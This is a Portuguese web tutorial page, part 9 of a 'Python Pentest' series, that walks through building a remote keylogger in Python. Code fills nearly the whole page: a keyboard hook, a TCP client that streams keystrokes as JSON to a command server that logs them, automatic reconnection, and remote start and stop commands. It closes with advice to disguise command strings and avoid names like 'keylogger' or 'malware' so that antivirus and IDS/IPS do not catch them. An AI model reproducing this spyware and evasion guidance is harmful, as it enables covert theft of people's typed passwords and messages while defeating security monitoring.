<!DOCTYPE html>
<html lang="pt-br">
    <head>
        <meta charset="UTF-8"/>
        <link rel="icon" href="imagens/favicon.ico"/>
        <title>Aprenda Python Pentest</title>
        <link rel="stylesheet" href="css/estilo.css"/>
    </head>
    <body>
        <div>
            <header>
                <h1>Aprenda Python Pentest</h1>
                <menu>
                    <li><a href="index.html">Página Inicial</a></li>
                    <li><a href="contato.html">Contato!</a></li>
                    <li><a href="tudo-sobre-python-pentest-1.html">Tudo sobre Python Pentest Parte 1!</a></li>
                    <li><a href="tudo-sobre-python-pentest-2.html">Tudo sobre Python Pentest Parte 2!</a></li>
                    <li><a href="tudo-sobre-python-pentest-3.html">Tudo sobre Python Pentest Parte 3!</a></li>
                    <li><a href="tudo-sobre-python-pentest-4.html">Tudo sobre Python Pentest Parte 4!</a></li>
                    <li><a href="tudo-sobre-python-pentest-5.html">Tudo sobre Python Pentest Parte 5!</a></li>
                    <li><a href="tudo-sobre-python-pentest-6.html">Tudo sobre Python Pentest Parte 6!</a></li>
                    <li><a href="tudo-sobre-python-pentest-7.html">Tudo sobre Python Pentest Parte 7!</a></li>
                    <li><a href="tudo-sobre-python-pentest-8.html">Tudo sobre Python Pentest Parte 8!</a></li>
                    <li><a href="tudo-sobre-python-pentest-9.html" onclick="alert('Você já Está na Matéria desse Link!'); return false">Tudo sobre Python Pentest Parte 9!</a></li>
                    <li><a href="tudo-sobre-python-pentest-10.html">Tudo sobre Python Pentest Parte 10!</a></li>
                    <li><a href="tudo-sobre-python-pentest-11.html">Tudo sobre Python Pentest Parte 11!</a></li>
                    <li><a href="tudo-sobre-python-pentest-12.html">Tudo sobre Python Pentest Parte 12!</a></li>
                    <li><a href="tudo-sobre-python-pentest-13.html">Tudo sobre Python Pentest Parte 13!</a></li>
                </menu>
            </header>
           
<h2>Tudo sobre Python Pentest Parte 9</h2>

<h3>Identificando Teclas</h3>

<p>Para criar um keylogger, instale a biblioteca <code>keyboard</code> primeiramente. Esse é um arquivo básico pra pegar as teclas usadas:</p>

<pre>
<code>
import keyboard

def evento(e):
    print(e.name)

keyboard.hook(evento)
keyboard.wait()
</code>
</pre>

<p>Só que ao teclar, ele duplica, já que ao pressionar uma tecla ele dispara um evento, e ao soltar a mesma dispara outro (key down e key up, respectivamente). Pra ver a diferença, deixe o print assim:</p>

<pre>
<code>
print(e.name, e.event_type)
</code>
</pre>

<p>Daí, pelo event_type, podemos filtrar os eventos:</p>

<pre>
<code>
def evento(e):
    if e.event_type == keyboard.KEY_DOWN: # Apenas quando a tecla é pressionada
        print(e.name)
</code>
</pre>

<p>Daí, já dá pra fazer um keylogger simples assim:</p>

<pre>
<code>
import keyboard

def evento(e):
    if e.event_type == keyboard.KEY_DOWN: # Apenas quando a tecla é pressionada
        tecla = e.name

        with open("teclas.txt", "a") as arqKey:
            arqKey.write(f"{tecla}\n")

keyboard.hook(evento)
keyboard.wait()
</code>
</pre>

<p>Mas é claro que podemos e devemos fazer melhoria, como por exemplo, trabalhar com a rede. Vamos supor esse servidor TCP simples:</p>

<pre>
<code>
import socket

sock = socket.socket() # Por padrão cria um socket com IPv4 e TCP

sock.bind(("0.0.0.0", 9090))
sock.listen()

print("Aguardando conexão...")

conn, cliente = sock.accept()

print("Conexão Recebida!")

while True:
    print(conn.recv(20).decode()) # Buffer pequeno, porque só pega uma tecla.
</code>
</pre>

<p>E deixe o keylogger assim:</p>

<pre>
<code>
import keyboard

def keylogger():
    keyboard.hook(evento)
    keyboard.wait()

def evento(e):
    if e.event_type == keyboard.KEY_DOWN: # Apenas quando a tecla é pressionada
        tecla = e.name

        print(tecla)

keylogger()
</code>
</pre>

<p>E depois assim:</p>

<pre>
<code>
import keyboard
import socket

def keylogger():
    keyboard.hook(evento)
    keyboard.wait()

def evento(e):
    global sock
    
    if e.event_type == keyboard.KEY_DOWN: # Apenas quando a tecla é pressionada
        tecla = e.name

        sock.send(tecla.encode())

sock = socket.socket()

sock.connect(("127.0.0.1", 9090))

keylogger()
</code>
</pre>

<p>Agora, defina essa função no keylogger e deixe as invocações assim:</p>

<pre>
<code>
def tentarConec():
    while True:
        try:
            sk = socket.socket()
            sk.connect(("127.0.0.1", 9090))

            return sk
        except:
            print("Não conseguiu conectar! Tentando novamente em 2 segundos...")
            time.sleep(2) # Importe time

sock = tentarConec()

keylogger()
</code>
</pre>

<p>Daí, altere o if da função evento, assim:</p>

<pre>
<code>
if e.event_type == keyboard.KEY_DOWN:
    try:
        tecla = e.name

        sock.send(tecla.encode())
    except (ConnectionAbortedError, BrokenPipeError, ConnectionResetError):
        sock.close()
        keyboard.unhook_all() # Pra ele parar de monitorar as teclas
</code>
</pre>

<p>E deixe o final do código assim:</p>

<pre>
<code>
while True:
    sock = tentarConec()

    keylogger()
</code>
</pre>

<p>Defina essa variável global dentro da função evento, antes de todo o código:</p>

<pre>
<code>
global monitorar
</code>
</pre>

<p>Coloque as declarações antes das funções, dessas variáveis aqui:</p>

<pre>
<code>
monitorar = True
sock = None
</code>
</pre>

<p>Deixe a função keylogger assim:</p>

<pre>
<code>
def keylogger():
    global monitorar
    monitorar = True

    keyboard.hook(evento)

    while monitorar:
        time.sleep(0.1)
</code>
</pre>

<p>E no except da função evento:</p>

<pre>
<code>
sock.close()
monitorar = False
keyboard.unhook_all() # Pra ele parar de monitorar a tecla
</code>
</pre>

<h3>Estruturando nosso Script</h3>

<p>Para adicionar mais recursos nos nossos scripts, precisaremos estruturar os mesmos.</p>

<p>No programa do Servidor TCP, faremos assim:</p>

<pre>
<code>
import socket
import sys

def startSock(port):
    sock = socket.socket()

    sock.bind(("0.0.0.0", port))
    sock.listen()

    print("Aguardando conexão...")

    conn, cliente = sock.accept()

    print(f"Conexão Recebida de {cliente}!")

    return conn

def sendData(sock):
    while True:
        rawData = input("Comando &gt; ")

        sock.send(rawData.encode())

def recvData(sock):
    while True:
        rawData = sock.recv(1024)

        if rawData:
            print(rawData.decode())

porta = int(sys.argv[1])
sock = startSock(porta)
recvData(sock)
</code>
</pre>

<p>Daí, no lugar das últimas linhas, coloque isso pra usarmos threads:</p>

<pre>
<code>
porta = int(sys.argv[1])
sock = startSock(porta)

recv = threading.Thread(target = recvData, args = (sock,)) # Importe threading
send = threading.Thread(target = sendData, args = (sock,))

recv.start()
send.start()
</code>
</pre>

<p>No keylogger, defina essa função:</p>

<pre>
<code>
def recvData(sock):
    while True:
        rawData = sock.recv(1024)

        if rawData:
            comando = rawData.decode()

            if comando.lower() == "start keylogger":
                keylogger()
</code>
</pre>

<p>E deixe o while True do mesmo assim:</p>

<pre>
<code>
while True:
    sock = tentarConec()

    recvData(sock)
</code>
</pre>

<p>Dentro da função recvData, deixe o segundo if assim:</p>

<pre>
<code>
if comando.lower() == "start keylogger":
    monitorar = True
    th = threading.Thread(target = keylogger)
    th.start()
elif comando.lower() == "stop keylogger":
    monitorar = False
    keyboard.unhook_all()
</code>
</pre>

<p>E também defina dentro dessa mesma função monitorar como global.</p>

<p>Rode o keylogger e depois o servidor pra conectar, usando o prompt com o comando <code>python ServidorTCPKey.py 9090</code>, usando os comandos start keylogger e stop keylogger.</p>

<p>Só que isso dará erro de exibição na hora de escrever pra parar o keylogger. Para isso, ao invés de mostrar na tela, vamos salvar tudo num JSON.</p>

<p>Defina essa função no keylogger:</p>

<pre>
<code>
def sendData(key, data, sock):
    rawPacket = {key: data}
    packet = json.dumps(rawPacket) # Importe json
    sock.send(packet.encode())
</code>
</pre>

<p>E dentro do try de evento, faça assim:</p>

<pre>
<code>
tecla = e.name

sendData("tecla", tecla, sock)
</code>
</pre>

<p>Rode o keylogger e o Servidor de novo, veremos que ele recebe um JSON.</p>

<p>No servidor, altere o if de recvData assim:</p>

<pre>
<code>
if rawData:
    data = json.loads(rawData.decode()) # Importe json

    if "tecla" in data:
        with open("teclas.txt", "a") as arqKey:
            arqKey.write(f"{data["tecla"]}\n")
</code>
</pre>

<p>Execute o keylogger e o servidor.</p>

<p>Agora, no if mais interno do recvData do keylogger, chame a função sendData assim:</p>

<pre>
<code>
if comando.lower() == "start keylogger":
    monitorar = True
    sendData("alerta", "Iniciando Monitoramento ao Vivo", sock)
    th = threading.Thread(target = keylogger)
    th.start()
elif comando.lower() == "stop keylogger":
    monitorar = False
    sendData("alerta", "Parando Monitoramento ao Vivo", sock)
    keyboard.unhook_all()
</code>
</pre>

<p>E no recvData do servidor, altere o if mais interno assim:</p>

<pre>
<code>
if "tecla" in data:
    with open("teclas.txt", "a") as arqKey:
        arqKey.write(f"{data["tecla"]}\n")
elif "alerta" in data:
    msg = data["alerta"]
    print(f"[!] {msg}   \nComando &gt; ", end = "")
</code>
</pre>

<p>Agora, no servidor, rode ele e dê o comando <q>start keylogger</q>, ele exibirá a mensagem, a mesma coisa pro <q>stop keylogger</q>.</p>

<p>E no if mais interno do recvData do keylogger, adicione no final do bloco if elif, esse outro elif aqui:</p>

<pre>
<code>
elif comando.lower() == "exit":
    sock.close()
    break
</code>
</pre>

<p>E no sendData do servidor, coloque esse código dentro do while, abaixo do sock.send:</p>

<pre>
<code>
if rawData == "exit":
    sock.close()
    exit()
</code>
</pre>

<p>Pra não dar erro na execução ao colocar <q>exit</q>, vá no código do servidor, na função recvData, e circunde a declaração do socket em rawData assim, logo no começo do while:</p>

<pre>
<code>
try:
    rawData = sock.recv(1024)
except OSError:
    exit()
</code>
</pre>

<p>Pra estruturar melhor, deixe o if mais interno do recvData do keylogger assim:</p>

<pre>
<code>
if comando.lower() == "start keylogger":
    if monitorar:
        sendData("alerta", "Monitoramento já foi Iniciado!", sock)
    else:
        monitorar = True
        sendData("alerta", "Iniciando Monitoramento ao Vivo", sock)
        th = threading.Thread(target = keylogger)
        th.start()
elif comando.lower() == "stop keylogger":
    if not monitorar:
        sendData("alerta", "Monitoramento não foi Iniciado!", sock)
    else:
        monitorar = False
        sendData("alerta", "Parando Monitoramento ao Vivo", sock)
        keyboard.unhook_all()
elif comando.lower() == "exit":
    sock.close()
    break
</code>
</pre>

<p>No mesmo arquivo e na mesma função, deixe o início assim, antes de todos os ifs:</p>

<pre>
<code>
def recvData(sock):
    global monitorar
    monitorar = False

    while True:
        try:
            rawData = sock.recv(1024)
        except (ConnectionAbortedError, ConnectionResetError):
            sock.close()
            break
</code>
</pre>

<p>Daí, na função evento, no mesmo arquivo, apenas retire o <code>sock.close()</code> dentro do except dele.</p>

<p>Só que tem um porém, num keylogger verdadeiro não é ideal colocar no código um comando literal como "start keylogger". No sendData do servidor, podemos colocar assim, dentro do while, antes do sock.send:</p>

<pre>
<code>
rawData = input("Comando &gt; ")

if rawData == "start keylogger":
    rawData = "sk1"
elif rawData == "stop keylogger":
    rawData = "sk0"    
</code>
</pre>

<p>E no recvData do keylogger, faça assim:</p>

<pre>
<code>
if comando.lower() == "sk1":
    # O restante do código permanece
elif comando.lower() == "sk0":
    # O restante do código permanece
</code>
</pre>

<p>Da mesma forma, podemos mudar o nome da função keylogger, qualquer coisa envolvendo nomes como malware, ransomware, keylogger, criptografar e coisas do tipo, pois essas strings são as primeiras a serem pegas por antivírus e sistemas IDS e IPS. Podemos até fazer um help. Esse ficaria no sendData do servidor, abaixo do stop keylogger:</p>

<pre>
<code>
if rawData == "start keylogger":
    rawData = "sk1"
elif rawData == "stop keylogger":
    rawData = "sk0"
elif rawData == "help":
    print(help) # Defina a variável help no início da função sendData
    continue # Reinicia o laço while
</code>
</pre>

<ul>
    <li><a href="tudo-sobre-python-pentest-8.html">Parte Anterior da Matéria!</a></li>
    <li><a href="tudo-sobre-python-pentest-10.html">Continuação da Matéria!</a></li>
</ul>

        </div>
    </body>
</html>